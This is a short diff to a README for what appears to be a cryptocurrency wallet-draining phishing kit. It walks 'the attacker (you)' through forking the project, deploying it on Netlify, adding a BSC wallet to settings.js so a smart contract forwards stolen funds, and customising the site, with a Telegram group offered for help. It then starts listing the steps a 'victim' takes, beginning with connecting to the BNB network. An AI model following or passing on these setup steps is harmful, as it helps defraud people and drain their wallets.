@@ -18,18 +18,20 @@ Deploy steps
 4. Add your wallet to settings.js file use bsc address 
 
 
-Steps you have to do as the attacker
+Steps you have to do as the attacker (you)
 
 1. fork
 
 2. deploy on netify
 
-3. add bsc wallet to settings.js
+3. add bsc wallet to settings.js if you dont the smart contract will not foward it to you
 
-4. host a site
+4. go to netify and confirm deployment
+
+5. edit the html file if you want to change the site appearance for help join telegram
 
 
-Steps that the victim has to do
+Steps that the !!! victim !!! has to do
 
 1.first connect to bnb network
 
